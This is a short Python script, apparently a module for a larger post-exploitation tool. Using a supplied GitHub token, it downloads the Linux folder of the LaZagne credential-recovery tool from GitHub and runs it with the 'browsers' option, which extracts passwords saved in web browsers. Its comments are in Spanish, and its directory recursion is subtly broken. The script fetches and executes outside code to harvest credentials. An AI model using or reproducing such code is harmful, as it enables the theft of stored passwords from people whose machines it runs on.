import subprocess
import requests
import base64
import os

def downloadFile(urlb, token):
    print('[!] Descargando ' + urlb)
    headers = {
        'Authorization': 'Bearer ' + token
    }
    res = requests.get(urlb, headers=headers).json()
    if isinstance(res, list):  # Si la respuesta es una lista, significa que es un directorio
        for file_info in res:
            if file_info['type'] == 'file':  # Si es un archivo, lo descargamos
                print('[!] Descargando archivo ' + file_info['name'])
                download_url = file_info['download_url']
                file_content = requests.get(download_url).content
                with open(os.path.join('Linux', file_info['name']), 'wb') as f:
                    f.write(file_content)
            elif file_info['type'] == 'dir':  # Si es un directorio, lo exploramos
                print('[!] Explorando directorio ' + file_info['name'])
                new_path = os.path.join('Linux', file_info['name'])
                os.makedirs(new_path, exist_ok=True)
                downloadFile(file_info['url'], token)
    else:
        print('[-] ' + res.get('message', 'Error desconocido'))

def run(token):
    urlb = "https://api.github.com/repos/AlessandroZ/LaZagne/contents/Linux/"
    
    # Crear la carpeta si no existe
    if not os.path.exists('Linux'):
        os.makedirs('Linux')

    # Descargar el directorio
    downloadFile(urlb, token)
    
    # Ejecutar el archivo con el argumento "all"
    print('[!] Ejecutando laZagne.py')
    subprocess.run(["python3", os.path.join('Linux', 'laZagne.py'), "browsers"], check=True)

